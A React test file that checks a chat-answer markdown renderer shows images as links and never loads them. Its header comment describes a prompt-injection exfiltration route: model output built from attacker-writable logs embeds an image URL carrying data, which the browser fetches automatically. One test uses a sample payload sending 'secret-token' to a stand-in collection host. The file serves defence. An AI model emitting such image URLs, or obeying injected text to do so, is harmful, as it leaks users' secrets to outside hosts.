/**
 * An image in a chat answer is shown as a link and never loaded.
 *
 * Chat answers are model output, and the model reads test logs anyone can
 * write. An answer containing `![x](https://host/?q=<data>)` rendered as an
 * <img>, which the browser fetched at once, sending the data in the URL with
 * no click; the CSP's img-src allowed any https: host (OSS review 2026-11-12).
 */
import { describe, expect, it } from 'vitest'
import { render, screen } from '@testing-library/react'
import { MemoryRouter } from 'react-router-dom'

import ChatMarkdown from './ChatMarkdown'

const renderAnswer = (text: string) =>
  render(
    <MemoryRouter>
      <ChatMarkdown text={text} />
    </MemoryRouter>,
  )

describe('ChatMarkdown images', () => {
  it('renders an image as a link, not an <img>', () => {
    const { container } = renderAnswer('Result ![chart](https://example.invalid/collect?q=secret-token)')
    expect(container.querySelector('img')).toBeNull()
    const link = screen.getByTestId('chat-image-link')
    expect(link).toHaveAttribute('href', 'https://example.invalid/collect?q=secret-token')
    expect(link).toHaveAttribute('rel', 'noreferrer noopener')
    expect(link).toHaveTextContent('Image: chart')
  })

  it('names the URL when the image has no alt text', () => {
    const { container } = renderAnswer('![](https://example.invalid/a.png)')
    expect(container.querySelector('img')).toBeNull()
    expect(screen.getByTestId('chat-image-link')).toHaveTextContent('https://example.invalid/a.png')
  })

  it('still renders ordinary links and tables', () => {
    renderAnswer('See [the run](/runs/1).\n\n| a | b |\n|---|---|\n| 1 | 2 |')
    expect(screen.getByRole('link', { name: 'the run' })).toHaveAttribute('href', '/runs/1')
    expect(screen.getByRole('table')).toBeInTheDocument()
  })
})
